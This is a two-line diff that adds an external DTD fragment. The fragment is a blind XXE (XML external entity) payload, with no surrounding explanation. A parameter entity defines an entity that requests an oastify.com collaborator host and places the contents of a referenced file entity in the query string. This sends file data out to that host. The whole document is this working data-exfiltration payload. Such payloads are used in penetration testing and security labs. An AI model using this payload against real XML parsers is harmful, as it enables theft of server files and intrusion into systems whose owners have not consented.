@@ -1,0 +1,2 @@
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://rzuwql1exybj86xcimy77r2q8hec2hq6.oastify.com/?collect=%file;'>">
+%all;
